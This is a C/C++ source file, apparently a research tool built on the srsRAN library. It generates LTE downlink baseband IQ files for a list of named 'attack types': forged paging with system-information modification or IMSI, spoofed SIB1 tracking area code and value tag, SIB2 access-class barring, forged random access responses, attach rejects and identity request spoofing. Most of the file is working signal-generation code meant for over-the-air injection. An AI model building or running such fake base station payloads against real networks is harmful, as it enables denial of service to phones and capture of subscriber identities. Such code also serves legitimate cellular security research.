#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <getopt.h>
#include "gen_sample.h"

#define SRSRAN_SIRNTI 0xFFFF
#define SRSRAN_PRNTI 0xFFFE
#define SRSRAN_MRNTI 0xFFFD
#define SRSRAN_CRNTI 0x47

static srsran_cell_t cell = {
  100,                // nof_prb
  2,                 // nof_ports
  420,                 // cell_id
  SRSRAN_CP_NORM,    // cyclic prefix
  SRSRAN_PHICH_NORM, // PHICH length
  SRSRAN_PHICH_R_1,  // PHICH resources
  SRSRAN_FDD,
};
static srsran_tm_t tm = SRSRAN_TM1;
static bool enable_256qam = false;
static uint16_t rnti = SRSRAN_PRNTI;
static uint32_t cfi = 3;
static uint32_t tti = -1;
static int attack_type = 0;
char outputfile[256] = "output.fc32";  // ✅ 可读可写数组
static FILE *fp = NULL;
static cf_t zero_buff[10240] = {0,};
static uint8_t imsi_buff[100] = {0,};
static std::string imsi  = "000000000000000";
static uint sys_info_value_tag = 5;
static int tac = 10;
static srsran_enb_dl_t* enb_dl = NULL;
static srsran_softbuffer_tx_t* softbuffer_tx[SRSRAN_MAX_TB] = {};
static uint8_t* payload[SRSRAN_MAX_TB] = {};
static uint32_t payload_len = 0;
static cf_t* signal_buffer[SRSRAN_MAX_PORTS] = {NULL};
static srsran_dl_sf_cfg_t sf_cfg_dl = {{0}};
uint32_t preamble =  6;

void generate_message(uint8_t* payload[], uint32_t* payload_len, const char* prog);
int get_attack_type_from_name(const char* name);
void parse_args(int argc, char **argv);
void usage(const char *prog);
int generate_format1a_broadcast(uint32_t tbs_bytes, uint32_t cell_nof_prb, uint32_t rv, uint16_t rnti, srsran_dci_dl_t* dci);

enum AttackType {
  PAGING_SYSINFOMOD,
  PAGING_IMSI,
  SIB1_SYSINFOVALUETAG,
  SIB1_TAC,
  SIB2_ACBARRING,
  RAR,
  SIB1_ORIGINAL,
  ATTACH_REJECT,
  IDENTITY_REQUEST,  // 新增

  ATTACK_TYPE_COUNT
};

// 映射表：字符串 -> 描述
struct AttackTypeInfo {
  const char* name;
  const char* desc;
};

const AttackTypeInfo attack_types[ATTACK_TYPE_COUNT] = {
  {"paging_sysinfmod",     "Paging System Information Modification"},
  {"paging_imsi",          "Paging with IMSI"},
  {"sib1_sysinfovaltag",   "SIB1 SystemInfoValueTag Attack"},
  {"sib1_tac",             "SIB1 TAC Spoofing"},
  {"sib2_acbarring",       "SIB2 AC Barring Modification"},
  {"rar",                  "Random Access Response Forgery"},
  {"sib1_ori",             "SIB1 Original (Normal)"},
  {"attach_reject",        "Attach Reject with Custom Cause"},
  {"identity_request",     "Identity Request Spoofing"},  // 新增
};

// 使用说明
void usage(const char *prog) {
  printf("Usage: %s [options]\n", prog);
  printf("Options:\n");
  printf("  -c <cell_id>      Cell ID [Default %u]\n", cell.id);
  printf("  -f <cfi>          CFI [Default %u]\n", cfi);
  printf("  -p <nof_prb>      Bandwidth in PRBs [Default %u]\n", cell.nof_prb);
  printf("  -s <tti>          Subframe/TI [Default %u]\n", tti);
  printf("  -r <rnti>         RNTI (hex ok, e.g., 0xfffe) [Default 0x%x]\n", rnti);
  printf("  -o <file>         Output file [Default %s]\n", outputfile);
  printf("  -m <imsi>         IMSI [Default %s]\n", imsi.c_str());
  printf("  -i <preamble>     Preamble index [Default %u]\n", preamble);
  printf("  --type <name>     Attack/message type (required)\n");

  // 列出所有支持的类型
  printf("\nSupported message types:\n");
  for (int i = 0; i < ATTACK_TYPE_COUNT; ++i) {
    printf("  %-20s : %s\n", attack_types[i].name, attack_types[i].desc);
  }

  // 示例
  printf("\nExamples:\n");
  printf("  Paging System Info Mod: %s --type paging_sysinfmod\n", prog);
  printf("  Paging with IMSI:       %s --type paging_imsi -m 460017837217696\n", prog);
  printf("  Attach Reject:          %s --type attach_reject -r 0x46 -s 5 -o out_rej -p 100 -c 420\n", prog);
}

#include <getopt.h>  // 确保已包含

// 必须在函数外定义
static const char* optstring = "c:f:p:s:r:o:m:i:hv";  // 注意：没有 t 或 T，但 --type 会用 'T'

static struct option long_options[] = {
    {"type", required_argument, 0, 'T'},  // 使用 'T' 作为 --type 的短选项代号
    {0, 0, 0, 0}  // 结束标志
};

// 解析参数
void parse_args(int argc, char **argv) {
  int opt;
  bool type_set = false;
  int option_index = 0;

  // 重置 getopt 内部状态（可选，多线程安全）
  optind = 1;

  while ((opt = getopt_long(argc, argv, optstring, long_options, &option_index)) != -1) {
    switch (opt) {
      case 'c':
        cell.id = (uint32_t)strtol(optarg, NULL, 10);
        break;
      case 'f':
        cfi = (uint32_t)strtol(optarg, NULL, 10);
        break;
      case 'p':
        cell.nof_prb = (uint32_t)strtol(optarg, NULL, 10);
        break;
      case 's':
        tti = (uint32_t)strtol(optarg, NULL, 10);
        break;
      case 'r':
        rnti = (uint16_t)strtol(optarg, NULL, 0); // 支持 0x
        break;
      case 'o':
        strncpy(outputfile, optarg, sizeof(outputfile) - 1);
        outputfile[sizeof(outputfile) - 1] = '\0';
        break;
      case 'm':
        imsi = std::string(optarg);
        break;
      case 'i':
        preamble = (uint32_t)strtol(optarg, NULL, 10);
        break;
      case 'h':
        usage(argv[0]);
        exit(0);
      case 'v':
        // 增加日志级别（如果支持）
        increase_srsran_verbose_level();
        break;
      case 'T':  // 对应 --type
        attack_type = get_attack_type_from_name(optarg);
        if (attack_type == -1) {
          fprintf(stderr, "❌ Invalid attack type: '%s'\n", optarg);
          fprintf(stderr, "Run '%s --help' to see valid types.\n", argv[0]);
          exit(-1);
        }
        type_set = true;
        break;
      case '?':
        // getopt_long 已经打印错误，这里统一处理
        usage(argv[0]);
        exit(-1);
      default:
        fprintf(stderr, "❌ Unknown error in argument parsing\n");
        usage(argv[0]);
        exit(-1);
    }
  }

  // 检查是否设置了 --type
  if (!type_set) {
    fprintf(stderr, "❌ Missing required argument: --type\n");
    usage(argv[0]);
    exit(-1);
  }
}
int main(int argc, char** argv) {
  parse_args(argc,argv);
  srsran_use_standard_symbol_size(true); 
  logging::init_log_to_file("../log/output.log");
  MY_LOG() << "【test yg】start";

  // init, after acquire cell info.
  enb_dl = (srsran_enb_dl_t* )srsran_vec_malloc(sizeof(srsran_enb_dl_t));
  if (!enb_dl) {
      ERROR("Error allocating buffer\n");
      return -1;
  }
  /*
    * Allocate Memory
    */
  for (uint32_t i = 0; i < cell.nof_ports; i++) {
      signal_buffer[i] = (cf_t *)srsran_vec_malloc(sizeof(cf_t) * SRSRAN_SF_LEN_MAX);
      if (!signal_buffer[i]) {
      ERROR("Error allocating buffer");
      return -1;
      }
  }

  for (int i = 0; i < SRSRAN_MAX_TB; i++) {
      softbuffer_tx[i] = (srsran_softbuffer_tx_t*)calloc(sizeof(srsran_softbuffer_tx_t), 1);
      if (!softbuffer_tx[i]) {
      ERROR("Error allocating softbuffer_tx");
      return -1;
      }

      //if (srsran_softbuffer_tx_init(softbuffer_tx[i], SRSRAN_MAX_PRB)) {
      if (srsran_softbuffer_tx_init(softbuffer_tx[i], cell.nof_prb)) {

      ERROR("Error initiating softbuffer_tx");
      return -1;
      }

      payload[i] = (uint8_t *)srsran_vec_malloc(sizeof(uint8_t) * 2048);
      if (!payload[i]) {
      ERROR("Error allocating data tx");
      return -1;
      }
      memset(payload[i], 0, sizeof(uint8_t) * 2048);
  }

  /*
   * Initialise eNb
   */
  //if (srsran_enb_dl_init(enb_dl, signal_buffer, SRSRAN_MAX_PRB)) {
  if (srsran_enb_dl_init(enb_dl, signal_buffer, cell.nof_prb)) {

      ERROR("Error initiating eNb downlink");
      return -1;
  }

  if (srsran_enb_dl_set_cell(enb_dl, cell)) {
      ERROR("Error setting eNb DL cell");
      return -1;
  }
  generate_message(payload, &payload_len, argv[0]);
  

  // sf_cfg_dl
  sf_cfg_dl.tti = tti;
  sf_cfg_dl.cfi = cfi;
  sf_cfg_dl.sf_type = SRSRAN_SF_NORM;

  // generate dci
  srsran_dci_location_t dci_locations[SRSRAN_MAX_CANDIDATES];
  uint32_t num_locations;
  num_locations = srsran_pdcch_common_locations(&enb_dl->pdcch, dci_locations, SRSRAN_MAX_CANDIDATES, cfi);

  srsran_dci_dl_t dci = {0,};
  srsran_dci_cfg_t dci_cfg = {0,};

  dci.location = dci_locations[0];
  //test yg 0730 add pdcch order
  //dci.is_pdcch_order = true;
  //dci.preamble_idx   = 6;
  //dci.prach_mask_idx = 1;
  generate_format1a_broadcast(payload_len, cell.nof_prb, 0, rnti, &dci);
  // encode
  srsran_enb_dl_put_base(enb_dl, &sf_cfg_dl); // sync失败，无法同步
  //srsran_enb_dl_put_base_wo_sync(enb_dl, &sf_cfg_dl);
  if (srsran_enb_dl_put_pdcch_dl(enb_dl, &dci_cfg, &dci)) {
      ERROR("Error putting PDCCH sf_idx=%d", sf_cfg_dl.tti);
      return -1;
  }
  srsran_pdsch_cfg_t pdsch_cfg;
  if (srsran_ra_dl_dci_to_grant(&cell, &sf_cfg_dl, tm, enable_256qam, &dci, &pdsch_cfg.grant)) {
      ERROR("Computing DL grant sf_idx=%d", sf_cfg_dl.tti);
      return -1;
  }
  char str[512];
  srsran_dci_dl_info(&dci, str, 512);
  INFO("eNb PDCCH: rnti=0x%x, %s", rnti, str);
  for (uint32_t i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
      pdsch_cfg.softbuffers.tx[i] = softbuffer_tx[i];
  }
  // Enable power allocation
  pdsch_cfg.power_scale  = true;
  pdsch_cfg.p_a          = 0.0f;                      // 0 dB
  pdsch_cfg.p_b          = (tm > SRSRAN_TM1) ? 1 : 0; // 0 dB
  pdsch_cfg.rnti         = rnti;
  pdsch_cfg.meas_time_en = false;

  if (srsran_enb_dl_put_pdsch(enb_dl, &pdsch_cfg, payload) < 0) {
     // ERROR("Error putting PDSCH sf_idx=%d", sf_cfg_dl.tti);
  }
  srsran_pdsch_tx_info(&pdsch_cfg, str, 512);
  INFO("eNb PDSCH: rnti=0x%x, %s", rnti, str);

  srsran_enb_dl_gen_signal(enb_dl);
  //MY_LOG() << "【test yg】2";

  // signal_buffer write to file
  uint32_t zero_padding_len = SRSRAN_SF_LEN_PRB(cell.nof_prb)/10;
  //printf("zero_padding_len:%d\n", zero_padding_len);
  //printf("signal_buffer_len:%d\n", SRSRAN_SF_LEN_PRB(cell.nof_prb)+zero_padding_len*2);
  fp = fopen(outputfile, "wb");
  fwrite(zero_buff, zero_padding_len * sizeof(cf_t), 1, fp);
  fwrite(signal_buffer[0], SRSRAN_SF_LEN_PRB(cell.nof_prb) * sizeof(cf_t), 1, fp);
  fwrite(zero_buff, zero_padding_len * sizeof(cf_t), 1, fp); 
  fclose(fp);
 
  /*
//测试的写入文件:填充的0合入数组后写入
  cf_t* temp_buffer[SRSRAN_MAX_PORTS] = {NULL};
  for (uint32_t i = 0; i < SRSRAN_MAX_PORTS; i++) {
    temp_buffer[i] = srsran_vec_cf_malloc(SRSRAN_SF_LEN_MAX + zero_padding_len *2);
    if (!temp_buffer[i]) {
      perror("malloc");
      exit(-1);
    }
  }
  size_t signal_length = SRSRAN_SF_LEN_PRB(cell.nof_prb);
  memcpy(temp_buffer[0], zero_buff, zero_padding_len * sizeof(cf_t));
  memcpy(temp_buffer[0] + zero_padding_len, signal_buffer[0], signal_length * sizeof(cf_t));
  memcpy(temp_buffer[0] + zero_padding_len + signal_length, zero_buff, zero_padding_len * sizeof(cf_t));
  fwrite(temp_buffer[0], (SRSRAN_SF_LEN_MAX + zero_padding_len *2) * sizeof(cf_t), 1, fp);
  fclose(fp);
*/
  printf("OUTPUT: %s\n", outputfile);

  // free
  srsran_enb_dl_free(enb_dl);
  for (uint32_t i = 0; i < cell.nof_ports; i++) {
    if (signal_buffer[i]) {
      free(signal_buffer[i]);
    }
  }
  for (int i = 0; i < SRSRAN_MAX_TB; i++) {
    if (softbuffer_tx[i]) {
      srsran_softbuffer_tx_free(softbuffer_tx[i]);
      free(softbuffer_tx[i]);
    }

    if (payload[i]) {
      free(payload[i]);
    }
  }
  if (enb_dl) {
    free(enb_dl);
  }

  return 0;
}

void generate_message(uint8_t* payload[], uint32_t* payload_len, const char* prog){
  switch (attack_type) {
    case PAGING_SYSINFOMOD:
      rnti = SRSRAN_PRNTI;  // 0xFFFE
      tti = 9;
      snprintf(outputfile, sizeof(outputfile), "%s_sf%d.fc32", attack_types[attack_type].name, tti);
      printf("\n✅ Start to generate Paging Systeminfomodification msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
      gen_paging_sysinfmod(payload[0], sizeof(uint8_t) * 2048, payload_len);
      break;

    case PAGING_IMSI: {
      rnti = SRSRAN_PRNTI;  // 0xFFFE
      tti = 9;
      snprintf(outputfile, sizeof(outputfile), "%s_sf%d.fc32", attack_types[attack_type].name, tti);
      uint8_t imsi_buff[100] = {0};
      uint32_t imsi_len = imsi_to_array(imsi, imsi_buff);
      printf("IMSI is %s. Handling specific case.\n", imsi.c_str());
      printf("✅ Start to generate Paging IMSI msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
      gen_paging_imsi(payload[0], sizeof(uint8_t) * 2048, payload_len, imsi_buff, imsi_len);
      break;
    }

    case SIB1_SYSINFOVALUETAG:
      rnti = SRSRAN_SIRNTI;  // 0xFFFE
      tti = 5;
      snprintf(outputfile, sizeof(outputfile), "%s_sf%d.fc32", attack_types[attack_type].name, tti);
      printf("\n✅ Start to generate SIB1 Systeminfovaluetag msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
      gen_sib1_sysinfvaltag(payload[0], sizeof(uint8_t) * 2048, payload_len, sys_info_value_tag);
      break;

    case SIB1_TAC:
      rnti = SRSRAN_SIRNTI;  // 0xFFFE
      tti = 5;
      snprintf(outputfile, sizeof(outputfile), "%s_sf%d.fc32", attack_types[attack_type].name, tti);  
      printf("\n✅ Start to generate SIB1 TAC msg to subframe %d with rnti = 0x%x tac = %d.\n", tti, rnti, tac);
      gen_sib1_tac(payload[0], sizeof(uint8_t) * 2048, payload_len, tac);
      break;

    case SIB2_ACBARRING:
      rnti = SRSRAN_SIRNTI;  // 0xFFFE
      tti = 0;
      snprintf(outputfile, sizeof(outputfile), "%s_sf%d.fc32", attack_types[attack_type].name, tti);  
      printf("\n✅ Start to generate SIB2 ACBarring msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
      gen_sib2_acbarring(payload[0], sizeof(uint8_t) * 2048, payload_len);
      break;

    case RAR:
      snprintf(outputfile, sizeof(outputfile), "%s_sf%d.fc32", attack_types[attack_type].name, tti);  
      printf("\n✅ Start to generate RAR msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
      gen_rar_pdu(preamble, payload[0], sizeof(uint8_t) * 2048, payload_len);
      break;

    case SIB1_ORIGINAL:
      rnti = SRSRAN_SIRNTI;  // 0xFFFE
      tti = 5;
      snprintf(outputfile, sizeof(outputfile), "%s_sf%d.fc32", attack_types[attack_type].name, tti);  
      printf("\n✅ Start to generate SIB1 original msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
      gen_sib1_original(payload[0], sizeof(uint8_t) * 2048, payload_len);
      break;

    case ATTACH_REJECT:
      snprintf(outputfile, sizeof(outputfile), "%s_sf%d.fc32", attack_types[attack_type].name, tti);  
      printf("\n✅ Start to generate Attach Reject msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
      MY_LOG() << "test yg gen msg start";
      gen_attach_reject(payload[0], sizeof(uint8_t) * 2048, payload_len);
      MY_LOG() << "test yg gen msg end";
      break;

    case 8: // 你用了 attack_type == 8，但枚举中没有定义
      snprintf(outputfile, sizeof(outputfile), "%s_sf%d.fc32", attack_types[attack_type].name, tti);  
      printf("\n✅ Start to generate Identity Request msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
      gen_identity_request(payload[0], sizeof(uint8_t) * 2048, payload_len);
      break;

    default:
      fprintf(stderr, "❌ Unknown attack type: %d\n", attack_type);
      usage(prog);
      exit(-1);
  }
}


// 根据名字查找 attack_type
int get_attack_type_from_name(const char* name) {
  for (int i = 0; i < ATTACK_TYPE_COUNT; ++i) {
    if (strcasecmp(name, attack_types[i].name) == 0) {
      return i;
    }
  }
  return -1; // not found
}

int generate_format1a_broadcast(uint32_t tbs_bytes, uint32_t cell_nof_prb, uint32_t rv, uint16_t rnti, srsran_dci_dl_t* dci) {
  /* Calculate I_tbs for this TBS */
  uint32_t l_crb = 0;
  uint32_t rb_start = 0;
  int tbs = tbs_bytes * 8;
  int i;
  int mcs = -1;
  for (i = 0; i < 27; i++) {
      if (srsran_ra_tbs_from_idx(i, 2) >= tbs) {
      dci->type2_alloc.n_prb1a = srsran_ra_type2_t::SRSRAN_RA_TYPE2_NPRB1A_2;
      l_crb                    = 2;
      mcs                      = i;
      tbs                      = srsran_ra_tbs_from_idx(i, 2);
      break;
      } else if (srsran_ra_tbs_from_idx(i, 3) >= tbs) {
      dci->type2_alloc.n_prb1a = srsran_ra_type2_t::SRSRAN_RA_TYPE2_NPRB1A_3;
      l_crb                    = 3;
      mcs                      = i;
      tbs                      = srsran_ra_tbs_from_idx(i, 3);
      break;
      }
  }
  if (i == 28) {
      ERROR("Can't allocate Format 1A for TBS=%d\n", tbs);
      return -1;
  }
  if (l_crb == 0) {
      ERROR("L_crb is 0\n");
      return -1;
  }

  INFO("ra_tbs=%d/%d, tbs_bytes=%d, tbs=%d, mcs=%d",
          srsran_ra_tbs_from_idx(mcs, 2),
          srsran_ra_tbs_from_idx(mcs, 3),
          tbs_bytes,
          tbs,
          mcs);

  dci->alloc_type       = SRSRAN_RA_ALLOC_TYPE2;
  dci->type2_alloc.mode = srsran_ra_type2_t::SRSRAN_RA_TYPE2_LOC;
  dci->type2_alloc.riv  = srsran_ra_type2_to_riv(l_crb, rb_start, cell_nof_prb);
  dci->pid              = 0;
  dci->tb[0].mcs_idx    = mcs;
  dci->tb[0].rv         = rv;
  dci->format           = SRSRAN_DCI_FORMAT1A;
  dci->rnti             = rnti;

  return tbs;
}
